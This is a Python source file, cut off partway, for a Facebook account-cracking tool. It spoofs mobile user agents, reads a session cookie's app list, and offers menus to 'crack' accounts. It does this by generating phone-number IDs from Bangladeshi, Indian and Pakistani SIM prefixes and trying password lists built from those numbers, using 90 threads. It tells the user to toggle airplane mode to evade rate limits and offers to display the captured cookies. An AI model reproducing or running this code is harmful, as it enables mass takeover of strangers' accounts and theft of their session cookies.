"Mozilla/5.0 (Linux; U; Android 12; en-US; SM-G998U1 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Zenfone Max Pro M1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; MI 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; ASUS_X01BDA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; MI 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Redmi K20 Pro Premium Edition) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; YAL-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Pixel 3a XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.36 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Pixel 2 XL Build/PPR2.181005.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Micromax E453 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 4A Build/PPR2.181005.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Pro Build/PPR2.181005.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; moto g(6) Build/PDY29.48) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; ASUS_Z017DB Build/PPR2.181005.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; MIX 2S Build/PKQ1.180729.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-N960U Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.123 Mobile Safari/537.36 EdgA/42.0.0.2305",
"Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; TECNO IN6 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.8.8.1140 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; vivo 1803 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 UCBrowser/11.4.8.1012 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; PBAT00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.6.2",
"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; PBAT00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.6.2",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM6.171019.030.E1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.85 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Pixel 2 XL Build/OPM2.171019.029) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.85 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G925F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G920F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A720F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A510F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A310F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J700H) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J210F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.4 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91",
"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.3.2249.130976",
"Mozilla/5.0 (Linux; Android 11; SM-P610 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Lenovo TB-7306F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/hu_HU;FBAV/323.0.0.9.106;]",
"Mozilla/5.0 (Linux; Android 12; Mi 11 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Pixel 3a XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-A536N Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.232 Whale/1.0.0.0 Crosswalk/26.90.3.25 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G991U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; M2102J20SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.7.71.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E14",
"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A325F/A325FXXU2AVB3) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Ch",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Amazonb",
"Mozilla/5.0 (Linux; Android 11; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 (Eco",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; V2109) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QP1A.191005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; HD1905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; LIO-AL00 Build/HUAWEILIO-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.64 HuaweiBrowser/10.0.2.311 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Redmi 3S Build/QD1A.190821.014; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/7.8.3.40913AP",
"Mozilla/5.0 (Linux; Android 10; Moto G5 Plus (XT1686)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; CPH1931) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 9; zh-tw; ONEPLUS A6010 Build/PKQ1.180716.001) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1",
"Mozilla/5.0 (Linux; Android 9; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; itel W4001 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/295.0.0.10.119;]",
"Mozilla/5.0 (Linux; Android 10; itel A571W Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.88 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/298.0.0.10.115;]",
"Mozilla/5.0 (Linux; Android 10; R7_1 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/317.0.0.12.104;]",
"Mozilla/5.0 (Linux; Android 11; 5033XR Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/337.0.0.7.102;]",
"Mozilla/5.0 (Linux; Android 10; itel W4001 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/295.0.0.10.119;]",
"Mozilla/5.0 (Linux; Android 8.1.0; Sunny3 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML، مانند Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.1019.36; FBAV/319.0.0.7.107؛]",
"Mozilla/5.0 (Linux; Android 8.1.0; Sunny3 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/319.0.0.7.107;]",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi S2 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; itel A571W Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.88 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/298.0.0.10.115;]",
"Mozilla/5.0 (Linux; Android 10; TITAN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML، مانند Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.3EMAn; 332.0.0.22.108؛]",
"Mozilla/5.0 (Linux; Android 10; itel A571W Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.88 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/298.0.0.10.115;]",
"Mozilla/5.0 (Linux; Android 6.0; LG-K371 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/337.0.0.7.102;]",
"Mozilla/5.0 (Linux; Android 11; CTR-LX2 Build/HUAWEICTR-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.15.96;]",
"Mozilla/5.0 (Linux; Android 8.1.0; R1 Plus Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]",
"Mozilla/5.0 (Linux; Android 11; DQR22 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/317.0.0.12.104;]",
"Mozilla/5.0 (Linux; Android 10; itel W5004D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/240.0.0.9.115;]",
"Mozilla/5.0 (Linux; Android 10; itel W5004D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/240.0.0.9.115;]",
"Mozilla/5.0 (Linux; Android 11; EPIC PRO_1 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/298.0.0.10.115;]",
"Mozilla/5.0 (Linux; Android 9; S32 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/337.0.0.7.102;]",
"Mozilla/5.0 (Linux; Android 10; itel W4001S Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/249.0.0.10.119;]",
"Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]",]


session = requests.Session()
#---------------[ APP CHECKING DEF ]---------------#
def fb_app(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print("\r\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"\r\x1b[38;5;190m[\x1b[38;5;196m!\x1b[38;5;190m]\x1b[38;5;196m SORRY THERE IS NO ACTIVE APK")
    else:
        print("\r\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f'\r\x1b[38;5;190m[🎮\x1b[38;5;190m]\x1b[38;5;196m YOUR ACTIVE APPLICATION DETAILS ')
        print("\r\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for i in range(len(game)):
            print("\r\x1b[38;5;190m[\x1b[38;5;196m%s\x1b[38;5;190m]\x1b[38;5;196m %s\x1b[0m"%(i+1,game[i].replace("ACTIVE"," ACTIVE")))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print("\r\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"\r\x1b[38;5;190m[\x1b[38;5;196m!\x1b[38;5;190m]\x1b[38;5;196m SORRY THERE IS NO EXPIRED APK")
    else:
        print("\r\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f'\r\x1b[38;5;190m[\x1b[38;5;196m🎮\x1b[38;5;190m]\x1b[38;5;196m YOUR EXPIRED APPLICATION DETAILS ')
        print("\r\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for i in range(len(game)):
            print("\r\x1b[38;5;190m[\x1b[38;5;196m%s\x1b[38;5;190m]\x1b[38;5;196m %s\x1b[0m"%(i+1,game[i].replace("Expired"," Expired")))
#---------------[ END ]---------------#
def Jawnx(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :hking = '— 2009'
        elif ids[:9] in ['100000000']       :hking = '— 2009'
        elif ids[:8] in ['10000000']        :hking = '— 2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:hking = '— 2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:hking = '— 2010'
        elif ids[:6] in ['100001']          :hking = '— 2010/2011'
        elif ids[:6] in ['100002','100003'] :hking = '— 2011/2012'
        elif ids[:6] in ['100004']          :hking = '— 2012/2013'
        elif ids[:6] in ['100005','100006'] :hking = '— 2013/2014'
        elif ids[:6] in ['100007','100008'] :hking = '— 2014/2015'
        elif ids[:6] in ['100009']          :hking = '— 2015'
        elif ids[:5] in ['10001']           :hking = '— 2015/2016'
        elif ids[:5] in ['10002']           :hking = '— 2016/2017'
        elif ids[:5] in ['10003']           :hking = '— 2018/2019'
        elif ids[:5] in ['10004']           :hking = '— 2019/2020'
        elif ids[:5] in ['10005']           :hking = '— 2020'
        elif ids[:5] in ['10006','10007']:hking = '— 2021'
        elif ids[:5] in ['10008']           :hking = '— 2022'
        elif ids[:5] in ['10009','61552']:hking = '— 2023/2024'
        elif ids[:5] in ['61553']           :hking = '— 2023/2024'
        else:hking=''
    elif len(ids) in [9,10]:
        hking = '— 2008/2009'
    elif len(ids)==8:
        hking = '— 2007/2008'
    elif len(ids)==7:
        hking = '— 2006/2007'
    else:hking=''
    return hking
#--------------------------------[VERSION CHANGE]--------------------------------#
#try:
version = 'personal'#requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\xf7u\xf4pt\xf1\xd4\x8dp\x81\xb1\xdc\x83\\]\xfd\xf4s\x133\xf3\xf4\xcbR\x8b\x8a3\xf3\xf3\x00`\xff\x18\x04')).text

kfeyx = key()
def ____banner____():
    os.system("clear")
    print(f"""
\x1b[38;5;196m ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━┓
\x1b[38;5;196m ┃\x1b[97;1m ██████  ███████  █████  ██████  \x1b[38;5;196m┃\x1b[38;5;190m [\x1b[38;5;196m•\x1b[38;5;190m] \x1b[38;5;46mTOOL: \x1b[97;1mFILE - RANDM \x1b[38;5;196m ┃
\x1b[38;5;196m ┃\x1b[97;1m ██   ██ ██      ██   ██ ██   ██ \x1b[38;5;196m┣━━━━━━━━━━━━━━━━━━━━━━━━━┫
\x1b[38;5;196m ┃\x1b[97;1m ██   ██ █████   ███████ ██   ██ \x1b[38;5;196m┃\x1b[38;5;190m [\x1b[38;5;196m•\x1b[38;5;190m] \x1b[38;5;46mgithub: \x1b[97;1mDEAD-404 \x1b[38;5;196m   ┃
\x1b[38;5;196m ┃\x1b[97;1m ██   ██ ██      ██   ██ ██   ██ \x1b[38;5;196m┣━━━━━━━━━━━━━━━━━━━━━━━━━┫
\x1b[38;5;196m ┃\x1b[97;1m ██████  ███████ ██   ██ ██████  \x1b[38;5;196m┃\x1b[38;5;190m [\x1b[38;5;196m•\x1b[38;5;190m] \x1b[38;5;46mVERSION: \x1b[97;1m1.2 \x1b[38;5;196m       ┃
\x1b[38;5;196m ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━┳━━━━━━━━━━━━━━━━━━━┫
\x1b[38;5;196m ┃{green}KEY{white}:- {white}{kfeyx} \x1b[38;5;196m┃\x1b[38;5;190m[\x1b[38;5;196m•\x1b[38;5;190m] \x1b[38;5;46mTOOL: \x1b[97;1mPERSONAL\x1b[38;5;196m ┃
\x1b[38;5;196m ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━┛""")

def fuckxd():
    os.system('clear')
    ____banner____()
#━━━━[ LINE ]━━━━#
def linex():
        print(f"{yelloww}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#-------------------[LOCATION CHECK]-------------------#


def deadxd():
    ____banner____()
    linex()
    print(f'{rad}[{white}A{rad}] {green}Crack Start File Clone')
    print(f'{rad}[{white}B{rad}] {green}File Make For File Clone')
    print(f'{rad}[{white}C{rad}] {green}Crack Start Random Clone');linex()
    __Mahadi__ = input(f'{rad}[{white}×{rad}] {green}Selection  {white}:-︎ {yelloww}')
    if __Mahadi__ in ['A','a','01','1']:__FILEX__()
    elif __Mahadi__ in ['B','b','02','2']:os.system('python3 FILE-DUMP.py')
    elif __Mahadi__ in ['C','c','03','3']:SETINGX()
    else:print(f'\n[×]{rad} Choose Value Option... ');deadxd()

#━━━━[ SELECT MENU ]━━━━#
def SETINGX():
    ____banner____();linex()
    print(f"{green} [{white}A{green}] {white}> {yellow}Bangladesh\n {green}[{white}B{green}] >{cyan} India\n {green}[{white}C{green}] > {purple}Pakistan{cyan}");linex()
    __Mahadii__ = input(f'{rad}[{white}×{rad}]{green} SELECTION  {white}:-︎ {yelloww}')
    if __Mahadii__ in ['A','a','01','1']:RANDOM()
    elif __Mahadii__ in ['B','b','02','2']:INDIA()
    elif __Mahadii__ in ['C','c','03','3']:PAKISTAN()
    else:print(f'\n[×]{rad} Choose Value Option... ');SETINGX()

#━━━━[ BANGLADESH RANDOM ]━━━━#
def RANDOM():
    user=[]
    ck=[]
    ____banner____()
    linex()
    print(f"{rad}[{white}×{rad}] {green}SIM CODES {white} :-︎ {rad}[{white}018 017 016 013{rad}]");linex()
    code = input(f"{rad}[{white}×{rad}]{green} SELECTION  {white}:-︎ {yelloww}");linex()
    print(f"{rad}[{white}×{rad}] {green}EXAMPLE {white}   :-︎ {rad}[{white}10000 20000 30000{rad}]");linex()
    limit = int(input(f"{rad}[{white}×{rad}] {green}LIMITS     {white}:-︎ {yelloww}"));linex()
    xmk = input(f"{rad}[{white}×{rad}] {green}WANT TO SEE COOKIE {rad}[{green}Y{white}/{green}N{rad}] {white}:-︎ {yelloww}")
    for _ in range(limit):
        user.append("".join(random.choices(string.digits, k=8)))
    if xmk == "Y" or xmk == "y":
        ck.append("Y")
    elif xmk == "N" or xmk == "n":
        ck.append('N') 
    else:
        ck.append('N')
    with tred(max_workers=90) as MahadiSefat:
        ____banner____();linex();tl = str(len(user))
        print(f'{rad}[{white}×{rad}] {green}SIM CODE{rad}┼{white}{code}{rad}┼{green}TOTAL IDS{rad}┼{white}{tl}')
        print(f'{rad}[{white}×{rad}] {green}IF NO RESULT [{white}On{orange}/{white}Off{green}] AIRPLANE MODE')
        linex()
        for love in user:
            ids = code+love
            passlist = [ids,ids[:6],ids[:7],ids[5:],ids[4:],ids[:8],ids[3:]]
            MahadiSefat.submit(__API__,ids,passlist,tl,ck)
    print("");linex();print(f"{rad}[{white}×{rad}] {green}PROCESS HAS BEEN COMPLETED");print(f"{rad}[{white}×{rad}] {green}TOTAL OK   {white}:-︎ {green}{len(oks)}");linex();exit()
#━━━━[ INDIAN RANDOM ]━━━━#
def INDIA():
    user=[]
    ck=[]
    ____banner____();linex()
    code = input(f"{rad}[{white}×{rad}] {green}SIM CODES {white} :-︎ {rad}[{white}+91639 +91934 +91902 +91701{rad}]\n{rad}[{white}×{rad}]{green} SELECTION  {white}:-︎ {yelloww}")
    limit = int(input(f"{rad}[{white}×{rad}] {green}EXAMPLE {white}   :-︎ {rad}[{white}10000 20000 30000{rad}]\n{rad}[{white}×{rad}] {green}LIMITS     {white}:-︎ {yelloww}"))
    xmk = input(f"{rad}[{white}×{rad}] {green}WANT TO SEE COOKIE {rad}[{green}Y{white}/{green}N{rad}] {white}:-︎ {yelloww}")
    for _ in range(limit):
        user.append("".join(random.choices(string.digits, k=7)))
    if xmk == "Y" or xmk == "y":
        ck.append("Y")
    elif xmk == "N" or xmk == "n":
        ck.append('N') 
    else:
        ck.append('N')
    with tred(max_workers=90) as MahadiSefat:
        ____banner____();tl = str(len(user))
        print(f'{rad}[{white}×{rad}] {green}SIM CODE{rad}┼{white}{code}{rad}┼{green}TOTAL IDS{rad}┼{white}{tl}')
        print(f'{rad}[{white}×{rad}] {green}IF NO RESULT [{white}On{orange}/{white}Off{green}] AIRPLANE MODE')
        linex()
        for love in user:
            ids = code+love
            passlist = [ids,ids[:6],ids[:7],ids[5:],ids[4:],ids[:8],ids[3:], '57575751', '57273200', '59039200']
            MahadiSefat.submit(__API__,ids,passlist,tl,ck)
    print("");linex();print(f"{rad}[{white}×{rad}] {green}PROCESS HAS BEEN COMPLETED");print(f"{rad}[{white}×{rad}] {green}TOTAL OK   {white}:-︎ {green}{len(oks)}");linex();exit()
#━━━━[ PAKISTAN RANDOM ]━━━━#
def PAKISTAN():
    user=[]
    ck=[]
    ____banner____()
    code = input(f"{rad}[{white}×{rad}] {green}SIM CODES {white} :-︎ {rad}[{white}0310 0320 0330 0340{rad}]\n{rad}[{white}×{rad}]{green} SELECTION  {white}:-︎ {yelloww}")
    limit = int(input(f"{rad}[{white}×{rad}] {green}EXAMPLE {white}   :-︎ {rad}[{white}10000 20000 30000{rad}]\n{rad}[{white}×{rad}] {green}LIMITS     {white}:-︎ {yelloww}"))
